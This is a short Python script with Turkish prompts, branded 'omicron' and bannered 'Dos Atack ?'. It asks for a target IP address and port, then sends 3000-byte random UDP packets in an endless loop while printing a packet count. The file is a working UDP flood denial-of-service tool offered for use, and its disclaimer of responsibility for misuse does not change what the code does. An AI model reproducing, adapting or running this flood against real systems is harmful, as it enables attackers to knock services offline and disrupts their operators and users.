from colorama import Fore, Style
import socket
import random
from os import system
from art import *


omicron = text2art("omicron", font='shadow')
system("cls||clear")
print(omicron)
banner = Fore.LIGHTMAGENTA_EX + "╔═" + "═" * 13 + "╗\n" \
         "║    Dos Atack ?    ║\n" \
         "╚═" + "═" * 13 + "╝"

print(banner)
print(Fore.YELLOW + Style.BRIGHT + """


ℹ️ Kötüye kullanım dahilinde sorumluluk almamaktayım!\n""")
print(Fore.LIGHTGREEN_EX + "{</>} " + Style.RESET_ALL + "Made by " +
      Fore.LIGHTGREEN_EX + Style.BRIGHT + "omicr0n\n")


hedefIp = input(Fore.LIGHTBLUE_EX + "📶 Hedef ip giriniz: ")  # Wi-Fi ikonu eklendi
hedefPort = int(input(Fore.LIGHTBLUE_EX + "🔍 Hedef port giriniz: "))  # Arama/Bulma ikonu eklendi

bytes = random._urandom(3000)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sayac = 0

while True:
    sock.sendto(bytes, (hedefIp, hedefPort))
    sayac = sayac + 1
    print(Fore.LIGHTRED_EX + "🔒 Saldırı başlatıldı, gönderilen paket:%s" % (sayac))  # Kilit ve Güvenlik ikonu eklendi
